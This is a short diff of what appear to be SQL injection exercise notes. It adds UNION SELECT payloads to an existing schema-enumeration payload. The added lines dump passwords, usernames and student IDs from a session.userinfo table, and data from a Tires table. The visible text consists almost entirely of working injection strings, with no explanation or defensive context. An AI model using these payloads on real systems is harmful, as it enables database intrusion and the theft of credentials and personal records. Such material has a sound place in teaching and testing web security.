@@ -46,3 +46,7 @@ step 2 find out how many columns there are
 
 Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns; #
 
+Audi ' UNION SELECT passwd,2,username,studentID,5 FROM session.userinfo; #
+Audi ' UNION SELECT passwd,2,username,4,5 FROM session.userinfo; #
+
+Audi ' UNION SELECT name,2,cost,size,tireid FROM session.Tires; #
